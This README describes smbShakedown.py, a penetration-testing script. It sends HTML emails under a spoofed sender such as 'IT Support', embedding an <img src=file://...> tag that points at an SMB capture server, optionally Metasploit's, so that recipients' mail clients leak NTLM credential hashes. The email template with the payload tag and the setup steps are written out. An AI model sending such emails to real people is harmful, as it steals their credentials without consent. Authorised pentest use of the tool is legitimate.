#smbShakedown.py
    Description: A simplified SMB Email Client Attack script used for pentests.
    Created by: Nick Sanzotta / @beamr
    Version: smbShakedown.py v 1.0
  
***  
Installation:

    git clone https://github.com/NickSanzotta/smbShakedown.git
    cd smbShakedown/
    python smbShakedown.py

***
Usage:

    1.Enter SMTP Server address:
    
    2.Enter SMTP Server credentials: 
    (anonymous connections not supported.)
    
    3.Configure "from" and "to" addresses:
    (separate multiple email addresses with a comma)
    
    4.Enter SMBCapture Server IP address, so it can be placed in body of email:
    EX: <img src=file://127.0.0.1/image/foo.gif>
    
    5. Choose whether or not to launch Metasploit's SMB Capture server.

***
Example:
       
        Enter SMTP Server address[smtp.gmail.com]: 
        ENTERED: "smtp.gmail.com"

        Enter your SMTP Server Port[587]: 
        ENTERED: "587"

        Enter SMTP Server username[user@gmail.com]: 
        ENTERED: "user@gmail.com"

        Enter SMTP Server password: 

        Enter SMB Capture Server IP address[10.37.242.7]: 
        ENTERED:10.37.242.7

        Enter "from name":[IT Support]
        ENTERED:IT Support
        
        Enter "from address":[user@gmail.com]:user@gmail.com
        ENTERED:user@gmail.com
        
        Enter recipient(s) name[Bob]: Bob
        ENTERED:Bob
        
        etc..

***        
To update email template modify the following in source:
Becareful not to remove the variables {0},{1},{2},{3} and {4}

    ### EDIT: Email Message Template Below ###
	message = """From: {0} <{1}>
    To: {2} <{3}>
    MIME-Version: 1.0
    Content-type: text/html
    Subject: smbShakedown.py test.


    ...
    <b>smbShakedown.py test message.</b>
    <br>
    <img src=file://{4}/image/foo.gif>
    """
    ##########################################################

***
To do:

	Add file support for recipients
	Add error handling.


